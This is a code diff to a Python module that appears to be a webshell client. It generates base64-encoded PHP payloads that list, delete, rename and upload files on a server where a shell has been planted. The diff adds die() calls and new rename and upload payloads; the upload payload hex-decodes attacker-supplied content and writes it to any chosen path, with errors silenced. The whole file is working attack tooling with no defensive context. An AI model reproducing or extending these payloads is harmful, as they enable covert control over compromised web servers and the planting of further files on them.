@@ -15,6 +15,7 @@ def getFilePathBase():
     echo ("<ek>");
     echo json_encode($res);
     echo ("</ek>");
+    die();
     """
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
@@ -50,7 +51,7 @@ def getFilelistBase(path):
         echo json_encode($res);
         echo ("</ek>");
     }
-    getfile("%s");
+    getfile("%s");die();
     """% path
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
@@ -116,5 +117,37 @@ def deleteFile(path):
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
 
+def changeName(path, newnamepath):
+    code="""
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    echo("<ek>");;
+    echo(rename("%s","%s")?"1":"0");;
+    echo("</ek>");
+    die();""" % (path, newnamepath)
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
+def uploadFile(path, content):
+    code="""
+    @ini_set("display_errors","0");
+    @set_time_limit(0);
+    echo("<ek>");
+    function f($f,$c){
+        $c=str_replace("\r","",$c);
+        $c=str_replace("\n","",$c);
+        $buf="";
+        for($i=0;$i<strlen($c);$i+=2){
+	        $buf.=urldecode("%".substr($c,$i,2));
+        }
+        echo(fwrite(fopen($f,"w"),$buf)?"1":"0");;
+        echo("</ek>");
+        die();
+    }
+    """+"""f('%s','%s');""" % (path, content)
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
 if __name__ == '__main__':
-    print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
+    # print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
+    print(uploadFile('/vae/asd/asd', 'asdasd'))
